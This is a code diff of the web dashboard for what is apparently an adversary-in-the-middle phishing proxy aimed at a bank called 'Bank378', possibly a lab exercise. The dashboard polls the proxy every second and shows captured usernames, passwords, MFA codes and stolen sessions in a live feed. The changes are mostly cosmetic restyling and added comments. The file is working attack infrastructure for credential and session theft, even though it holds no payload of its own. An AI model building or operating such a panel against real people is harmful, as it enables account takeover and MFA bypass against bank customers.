@@ -3,13 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
     <title>Bank378 AiTM Dashboard</title>
     <style>
         body {
             margin: 0;
             font-family: Arial, Helvetica, sans-serif;
             background: #0b0f14;
-            color: #e8eef5;
+            color: #e8ebee;
         }
         .wrap {
             max-width: 1200px;
@@ -29,11 +30,11 @@
         }
         .title p {
             margin: 6px 0 0;
-            color: #9fb0c2;
+            color: #9fadbc;
         }
         .status {
             background: #121922;
-            border: 1px solid #223244;
+            border: 1px solid #233244;
             border-radius: 14px;
             padding: 14px 18px;
             min-width: 230px;
@@ -50,7 +51,6 @@
         }
         .grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
             gap: 16px;
             margin-bottom: 20px;
         }
@@ -66,15 +66,12 @@
             font-size: 1rem;
             color: #d6e4f0;
         }
-        .metric {
+        .value2 {
             font-size: 1.8rem;
             font-weight: bold;
             margin-bottom: 8px;
         }
-        .muted {
-            color: #9fb0c2;
-            font-size: 0.95rem;
-        }
+
         .value {
             word-break: break-word;
             font-family: Consolas, Monaco, monospace;
@@ -93,7 +90,7 @@
         .event {
             background: #0c1219;
             border: 1px solid #1f2c3a;
-            border-left: 4px solid #8b0000;
+            border-left: 4px solid #950101;
             border-radius: 12px;
             padding: 14px;
         }
@@ -112,13 +109,21 @@
             text-transform: uppercase;
             letter-spacing: 0.03em;
         }
-        .badge.credentials { background: #2f1f07; color: #ffd27d; }
-        .badge.mfa { background: #1b2140; color: #95a8ff; }
-        .badge.session { background: #183320; color: #8ee6aa; }
-        .badge.request { background: #2c2c2c; color: #d1d1d1; }
+        .badge.credentials { 
+            background: #2f1f07; color: #ffd27d; 
+        }
+        .badge.mfa { 
+            background: #1b2140; color: #95a8ff; 
+        }
+        .badge.session { 
+            background: #183320; color: #8ee6aa; 
+        }
+        .badge.request { 
+            background: #2c2c2c; color: #d1d1d1; 
+        }
         .kv {
             margin: 4px 0;
-            color: #d7e2ec;
+            color: #bfc9d2;
         }
         .small {
             color: #93a4b6;
@@ -137,21 +142,21 @@
         }
     </style>
 </head>
+
 <body>
     <div class="wrap">
         <div class="hero">
             <div class="title">
                 <h1>Bank378 AiTM Dashboard</h1>
-                <p>Captures credentials, MFA codes, and stolen sessions.</p>
             </div>
-                <div class="pill">Proxy Active (1s)</div>
+                <div class="pill">Proxy Refresh (1s)</div>
         </div>
 
 
         <div class="grid">
             <div class="card">
                 <h2>Total Captured Events</h2>
-                <div class="metric" id="total-events">0</div>
+                <div class="value2" id="total-events">0</div>
             </div>
             <div class="card">
                 <h2>Latest Credentials</h2>
@@ -168,6 +173,8 @@
         </div>
 
 
+
+
         <div class="card">
             <h2>Live Activity Feed</h2>
             <div id="feed" class="feed"></div>
@@ -176,7 +183,7 @@
 
 
     <script>
-        function escapeHtml(value) {
+        function escapeHtml(value) { //added html escape
             return String(value)
                 .replace(/&/g, '&amp;')
                 .replace(/</g, '&lt;')
@@ -187,6 +194,7 @@
 
 
         function renderEvent(event) {
+            //basically if the field exists, add to temp list and create an html event card
             const detailLines = [];
             if (event.username !== undefined) detailLines.push(`<div class="kv"><strong>User:</strong> ${escapeHtml(event.username)}</div>`);
             if (event.password !== undefined) detailLines.push(`<div class="kv"><strong>Password:</strong> ${escapeHtml(event.password)}</div>`);
@@ -216,10 +224,10 @@
 
         async function refreshDashboard() {
             try {
-                const response = await fetch('/api/events');
+                const response = await fetch('/api/events'); // talk to attacker_proxy
                 const data = await response.json();
 
-
+                //the four boxes on the top
                 document.getElementById('total-events').textContent = data.total_events;
                 renderLatest('#latest-credentials', data.latest_credentials ? `${data.latest_credentials.username} / ${data.latest_credentials.password}` : 'None');
                 renderLatest('#latest-mfa', data.latest_mfa ? data.latest_mfa.code : 'None');
@@ -233,15 +241,15 @@
                 }
 
 
-                feed.innerHTML = data.events.map(renderEvent).join('');
+                feed.innerHTML = data.events.map(renderEvent).join(''); //add every event into single str and replace live feed with those events
             } catch (error) {
-                document.getElementById('feed').innerHTML = '<div class="empty">Dashboard failed to update. Check that the proxy is still running.</div>';
+                document.getElementById('feed').innerHTML = '<div class="empty">Dashboard failed to update.</div>';
             }
         }
 
 
         refreshDashboard();
-        setInterval(refreshDashboard, 1000);
+        setInterval(refreshDashboard, 1000); //refreshes page every 1000 ms
     </script>
 </body>
 </html>
